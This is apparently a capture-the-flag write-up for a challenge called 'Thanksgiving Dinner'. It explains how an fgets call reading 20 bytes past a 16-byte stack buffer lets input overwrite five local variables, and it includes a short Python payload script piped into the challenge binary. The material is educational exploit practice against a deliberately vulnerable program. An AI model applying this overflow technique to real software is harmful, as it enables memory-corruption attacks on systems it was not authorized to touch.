# Thanksgiving Dinner

## Solution

This challenge is a simple buffer over write!

If we disassemble the vulnerable function we can see there is an fgets that allows 20 bytes more than the size of the buffer!
Using this we can overwrite 5 local variables.

First we will overload our buffer.
Once we overload the buffer we will start to bump up against the last variable defined.

```c
int x;
int y;
int w;
int z;
int a;
char buffer[16];
```

Since the stack grows **down** variables like arrays will grow up in memory.
Element 0 of buffer will be at a *lower* address than element 1. So to overwrite a we should dump 16 dummy characters.
Now we will be at `a` to overwrite it to be the correct value; which is 42.

We do this for each variable on the stack.

Here is the code to do this.

```python
import struct

payload = 'a' * 0x10

payload += struct.pack("I", 42)


payload += struct.pack("i", 0)

payload += struct.pack("I", 0x667463)

payload += struct.pack("i", -21)

payload += struct.pack("I", 0x1337)

print(payload)
```

`python exploit.py | ./turkey`

## Note

Ensure you have enabled 32-bit binary support if you have a 64-bit machine.
On Ubuntu you can run `sudo dpkg --add-architecture i386`.
